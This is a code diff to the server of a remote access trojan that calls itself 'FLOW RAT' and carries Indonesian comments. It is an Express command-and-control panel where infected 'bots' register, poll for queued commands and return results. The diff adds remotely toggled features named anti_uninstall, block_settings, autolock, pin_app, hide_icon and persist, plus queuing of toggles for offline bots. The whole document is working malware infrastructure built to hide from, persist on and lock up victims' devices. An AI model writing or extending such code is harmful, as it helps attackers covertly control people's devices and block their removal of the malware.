@@ -12,7 +12,11 @@ const HOST = '0.0.0.0';
 const AUTH_TOKEN = process.env.AUTH_TOKEN || 'flow-secret-token-2026';
 
 // ====== STORAGE (in-memory) ======
-const bots = {};
+const bots = {};       // { bot_id: { info, ip, last_seen, commands: [], last_result, features: {} } }
+const pendingToggles = {}; // { bot_id: { feature: bool } }
+
+// Feature list valid
+const VALID_FEATURES = ['anti_uninstall', 'block_settings', 'autolock', 'pin_app', 'hide_icon', 'persist'];
 
 // ====== MIDDLEWARE AUTH ======
 function requireAuth(req, res, next) {
@@ -29,25 +33,48 @@ app.get('/', (req, res) => {
         status: 'FLOW RAT Server Running',
         time: new Date().toISOString(),
         bots_total: Object.keys(bots).length,
-        version: '1.0.0',
+        version: '1.1.0',
         port: PORT
     });
 });
 
 // ====== BOT REGISTER ======
 app.post('/rat/register', (req, res) => {
-    const { bot_id, info } = req.body;
+    const { bot_id, info, features } = req.body;
     if (!bot_id) return res.status(400).json({ error: 'bot_id required' });
 
     if (!bots[bot_id]) {
-        bots[bot_id] = { commands: [], last_result: null };
+        bots[bot_id] = { commands: [], last_result: null, features: {} };
     }
     bots[bot_id].info = info || '-';
     bots[bot_id].last_seen = new Date().toISOString();
     bots[bot_id].ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '-';
 
+    // Sync feature state dari bot (bot = source of truth)
+    if (features && typeof features === 'object') {
+        bots[bot_id].features = features;
+    } else {
+        // Default semua OFF
+        if (Object.keys(bots[bot_id].features).length === 0) {
+            VALID_FEATURES.forEach(f => bots[bot_id].features[f] = false);
+        }
+    }
+
+    // Apply pending toggles kalau ada (bot baru online)
+    if (pendingToggles[bot_id]) {
+        Object.keys(pendingToggles[bot_id]).forEach(f => {
+            bots[bot_id].commands.push({
+                id: Date.now() + Math.random(),
+                cmd: 'toggle',
+                arg: f + ':' + (pendingToggles[bot_id][f] ? 'on' : 'off'),
+                created: new Date().toISOString()
+            });
+        });
+        delete pendingToggles[bot_id];
+    }
+
     console.log(`[BOT] register: ${bot_id} | ${info}`);
-    res.json({ status: 'ok', bot_id });
+    res.json({ status: 'ok', bot_id, features: bots[bot_id].features });
 });
 
 // ====== BOT POLL ======
@@ -74,6 +101,77 @@ app.post('/rat/result', (req, res) => {
     res.json({ status: 'ok' });
 });
 
+// ====== BOT REPORT FEATURE STATE ======
+app.post('/rat/report-state', (req, res) => {
+    const { bot_id, features } = req.body;
+    if (!bot_id) return res.status(400).json({ error: 'bot_id required' });
+
+    if (!bots[bot_id]) {
+        bots[bot_id] = { commands: [], last_result: null, features: {}, info: '-', last_seen: '-' };
+    }
+    if (features && typeof features === 'object') {
+        bots[bot_id].features = features;
+    }
+    bots[bot_id].last_seen = new Date().toISOString();
+
+    res.json({ status: 'ok', features: bots[bot_id].features });
+});
+
+// ====== PANEL TOGGLE FEATURE ======
+app.post('/rat/toggle', requireAuth, (req, res) => {
+    const { bot_id, feature, value } = req.body;
+
+    if (!bot_id || !feature) {
+        return res.status(400).json({ error: 'bot_id & feature required' });
+    }
+    if (!VALID_FEATURES.includes(feature)) {
+        return res.status(400).json({ error: 'invalid feature', valid: VALID_FEATURES });
+    }
+
+    const on = !!value;
+
+    if (!bots[bot_id]) {
+        // Bot belum pernah register — simpan pending
+        if (!pendingToggles[bot_id]) pendingToggles[bot_id] = {};
+        pendingToggles[bot_id][feature] = on;
+        return res.json({ status: 'pending', bot_id, feature, value: on, note: 'bot offline, toggle disimpan sebagai pending' });
+    }
+
+    const isOnline = bots[bot_id].last_seen && (Date.now() - new Date(bots[bot_id].last_seen).getTime()) < 60000;
+
+    // Update state di server
+    bots[bot_id].features[feature] = on;
+
+    if (isOnline) {
+        // Kirim command ke bot
+        bots[bot_id].commands.push({
+            id: Date.now() + Math.random(),
+            cmd: 'toggle',
+            arg: feature + ':' + (on ? 'on' : 'off'),
+            created: new Date().toISOString()
+        });
+        console.log(`[TOGGLE] ${bot_id} → ${feature}:${on ? 'on' : 'off'}`);
+        res.json({ status: 'queued', bot_id, feature, value: on });
+    } else {
+        // Bot offline — simpan pending
+        if (!pendingToggles[bot_id]) pendingToggles[bot_id] = {};
+        pendingToggles[bot_id][feature] = on;
+        res.json({ status: 'pending', bot_id, feature, value: on, note: 'bot offline, toggle disimpan' });
+    }
+});
+
+// ====== PANEL GET AGENT STATE ======
+app.get('/rat/agent-state/:bot_id', requireAuth, (req, res) => {
+    const { bot_id } = req.params;
+    if (!bots[bot_id]) {
+        return res.json({ features: {}, pending: pendingToggles[bot_id] || null });
+    }
+    res.json({
+        features: bots[bot_id].features || {},
+        pending: pendingToggles[bot_id] || null
+    });
+});
+
 // ====== PANEL SEND COMMAND (AUTH) ======
 app.post('/rat/command', requireAuth, (req, res) => {
     const { bot_id, command, arg } = req.body;
@@ -82,7 +180,8 @@ app.post('/rat/command', requireAuth, (req, res) => {
     }
 
     if (!bots[bot_id]) {
-        bots[bot_id] = { commands: [], last_result: null, info: '-', last_seen: '-' };
+        bots[bot_id] = { commands: [], last_result: null, info: '-', last_seen: '-', features: {} };
+        VALID_FEATURES.forEach(f => bots[bot_id].features[f] = false);
     }
 
     bots[bot_id].commands.push({
@@ -108,6 +207,7 @@ app.get('/rat/bots', requireAuth, (req, res) => {
             last_seen: b.last_seen,
             last_result: b.last_result,
             pending: b.commands.length,
+            features: b.features || {},
             status: isOnline ? 'online' : 'offline'
         };
     });
@@ -125,6 +225,7 @@ app.get('/rat/result/:bot_id', requireAuth, (req, res) => {
 app.delete('/rat/bot/:bot_id', requireAuth, (req, res) => {
     const { bot_id } = req.params;
     delete bots[bot_id];
+    delete pendingToggles[bot_id];
     res.json({ status: 'deleted' });
 });
 
